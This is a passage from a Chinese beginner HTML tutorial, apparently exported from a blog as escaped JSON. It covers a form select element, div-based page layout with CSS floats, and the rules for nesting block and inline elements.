&lt;br&gt; 城市&lt;select name=\"city\"&gt; &lt;option value=\"shanghai\"&gt;上海&lt;/option&gt; &lt;option value=\"beijing\"&gt;北京&lt;/option&gt; &lt;/select&gt; &lt;input type=\"submit\" name=\"\"&gt;&lt;br&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML布局HTML 布局 - 使用&lt;div&gt; 元素. 可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用css来设置样式。 这中间需要用到float：left等 来控制一个div中套用的div的位置。 HTML中&lt;div&gt;元素是块级元素，它可用于组合其他 HTML元素的容器。 &lt;div&gt; 元素的另一个常见的用途是文档布局。&lt;div&gt;元素经常与 CSS 一起使用，用来布局网页。 &lt;div&gt; 元素没有特定的含义。 练习： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;布局&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;div style=\"background: yellow; width: 50px;\"&gt; 这是个div这是个div这是个div这是个div &lt;/div&gt; --&gt; &lt;div style=\"background: yellow;height: 100px;\"&gt;导航&lt;/div&gt; &lt;div style=\"background: green;width: 20%; float: left; height: 300px;\"&gt;菜单&lt;/div&gt; &lt;di+v style=\"background: red;width: 80%; float: left;height: 300px;\"&gt;内容&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; HTML嵌套规则元素分类： 文字类块元素：p h1~h6 容器类块元素：div table tr td th form ul li ol dl dt dd 行元素:不独立成行，不可以 内容决定a img input strong em del span 特殊字符:br 规则 块元素可以嵌套行元素 &lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt; 行元素可以嵌套行元素 &lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt; 行元素不可以嵌套块元素 文字类抉元素不可以嵌套块元素 容器类抉元素可以嵌套块元素","categories":[],"tags":[]}]}